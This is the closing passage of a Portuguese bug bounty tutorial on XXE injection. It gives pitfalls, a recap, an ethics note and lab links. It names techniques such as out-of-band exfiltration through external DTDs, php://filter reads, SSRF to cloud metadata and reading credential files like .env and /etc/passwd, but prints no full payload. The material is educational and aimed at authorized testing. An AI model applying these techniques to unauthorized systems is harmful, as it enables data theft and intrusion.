- **Arquivo com `<`, `&` ou `]]>` quebra o XXE clássico.** Use `php://filter` (base64) ou exfiltração OOB pra arquivos "sujos".
- **`&` (geral) dentro de uma definição de entidade não é permitido**, e é por isso que o blind usa entidade de **parâmetro** (`%`) e o `&#x25;` escapado. Copie o DTD exatamente.
- **DTD externo precisa ser alcançável pelo alvo.** Sem saída de rede no servidor → sem OOB; parta pro error-based.
- **PHP moderno raramente dá XXE "de graça"**: só se o dev forçar `LIBXML_NOENT`/`LIBXML_DTDLOAD`. Não perca horas num PHP 8 default.
- **`LIBXML_NOENT` engana pelo nome:** ela **habilita** substituição de entidades. Nome péssimo, comportamento perigoso.
- **Billion Laughs ≠ XXE clássico:** a "bomba" de entidades (`&lol9;` aninhado) é **DoS** por expansão, não leitura de arquivo. Costuma valer menos e às vezes está fora de escopo (veja [Denial of Service de aplicação](/posts/denial-of-service-aplicacao/)).

## O que você precisa lembrar

- XXE = **abusar de entidade externa do XML** pra ler arquivo, fazer SSRF ou exfiltrar dado.
- Existe por **parser permissivo** (resolve entidade externa) + **XML controlado pelo atacante**.
- Não reflete? Não desista: **blind/OOB** (DTD externo + parameter entities) e **error-based** ainda exfiltram.
- A superfície escondida está nos **uploads** (SVG, DOCX/XLSX) e em **trocar JSON por XML**.
- O dinheiro mora no **alcance**: SSRF→metadata e leitura de **credenciais**.

> 💡 **Dica de ouro:** sempre que vir XML entrando na aplicação, faça **um** teste barato antes de tudo: uma entidade externa apontando pro Burp Collaborator. Se pingou, você tem XXE (mesmo cego). Esse único ping já vale o report, e abre a porta pra escalar até crítico.

## Nota ética

Tudo aqui é pra **testes autorizados**: bug bounty dentro do escopo, pentests contratados e labs legais. Ler `/etc/passwd` ou exfiltrar `.env` de um sistema de terceiros sem autorização é crime, e desnecessário, porque os labs abaixo replicam cada técnica deste post. Use pra proteger, reportar com responsabilidade e ensinar. Ao reportar, **mascare** segredos vazados e não baixe mais dados do que o necessário pra provar o impacto.

## Ferramentas + labs legais

- **[PortSwigger Web Security Academy — XXE](https://portswigger.net/web-security/xxe)**: 9 labs gratuitos que cobrem in-band, SSRF, blind OOB, error-based, XInclude e SVG. A melhor fonte pra praticar.
- **DVWA**, **bWAPP**, **WebGoat** (OWASP): todos têm módulo de XXE.
- **TryHackMe / HackTheBox**: máquinas com XXE em SOAP/SVG.

## Referências

- [PortSwigger — XML external entity (XXE) injection](https://portswigger.net/web-security/xxe) e [Blind XXE](https://portswigger.net/web-security/xxe/blind)
- [OWASP — XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [OWASP — XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PayloadsAllTheThings — XXE Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/XXE%20Injection/)
- [OWASP Top 10 — A05:2021 Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)

---
*Relacionado na série: [SSRF](/posts/ssrf/) · [LFI / Path Traversal](/posts/lfi-path-traversal/) · [XSS & HTML Injection](/posts/xss-html-injection/) · [API Security](/posts/api-security/) · [Denial of Service de aplicação](/posts/denial-of-service-aplicacao/) · base: [Fundamentos / Glossário](/posts/fundamentos-web-hacking/#glossário-rápido-os-termos-que-vão-aparecer-na-série) · [Recon & Discovery](/posts/recon-discovery/)*

---

*📚 Parte do **[Guia Completo de Bug Bounty](/posts/guia-bug-bounty/)**, o índice da série, do básico ao avançado.*
